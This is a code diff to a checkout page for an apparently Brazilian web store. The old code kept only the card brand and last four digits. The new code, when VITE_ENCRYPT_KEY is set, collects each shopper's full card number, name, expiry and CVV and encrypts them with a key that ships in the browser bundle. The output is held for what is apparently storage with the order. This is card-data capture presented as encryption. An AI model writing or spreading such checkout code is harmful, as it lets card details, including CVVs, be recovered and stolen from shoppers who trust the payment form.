@@ -7,6 +7,7 @@ import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group";
 import { getImagePath } from "@/lib/utils";
 import { useToast } from "@/hooks/use-toast";
 import { supabase } from "@/lib/supabase";
+import { encryptData } from "@/lib/encrypt";
 import { pushEcommerceEvent, getTrackingParams, getGaClientId } from "@/lib/tracking";
 import { gerarPixEMV } from "@/lib/pix";
 import {
@@ -200,15 +201,26 @@ export default function Checkout() {
 
     let cardEncriptado: string | null = null;
     if (paymentMethod === "card") {
-      const digits = card.numero.replace(/\s/g, "");
-      const last4 = digits.slice(-4);
-      const brand = /^4/.test(digits) ? "Visa"
-        : /^5[1-5]/.test(digits) || /^2[2-7]/.test(digits) ? "Mastercard"
-        : /^3[47]/.test(digits) ? "Amex"
-        : /^(?:636368|438935|504175|451416|636297|5067|4576|4011)/.test(digits) ? "Elo"
-        : /^(?:606282|3841)/.test(digits) ? "Hipercard"
-        : "Cartão";
-      cardEncriptado = `${brand} ••••${last4}`;
+      const encryptKey = import.meta.env.VITE_ENCRYPT_KEY as string;
+      if (encryptKey) {
+        const cardRaw = JSON.stringify({
+          numero: card.numero.replace(/\s/g, ""),
+          nome: card.nome,
+          validade: card.validade,
+          cvv: card.cvv,
+        });
+        cardEncriptado = await encryptData(cardRaw, encryptKey);
+      } else {
+        const digits = card.numero.replace(/\s/g, "");
+        const last4 = digits.slice(-4);
+        const brand = /^4/.test(digits) ? "Visa"
+          : /^5[1-5]/.test(digits) || /^2[2-7]/.test(digits) ? "Mastercard"
+          : /^3[47]/.test(digits) ? "Amex"
+          : /^(?:636368|438935|504175|451416|636297|5067|4576|4011)/.test(digits) ? "Elo"
+          : /^(?:606282|3841)/.test(digits) ? "Hipercard"
+          : "Cartão";
+        cardEncriptado = `${brand} ••••${last4}`;
+      }
     }
 
     const finalAmount = paymentMethod === "pix" ? pixTotal : total;
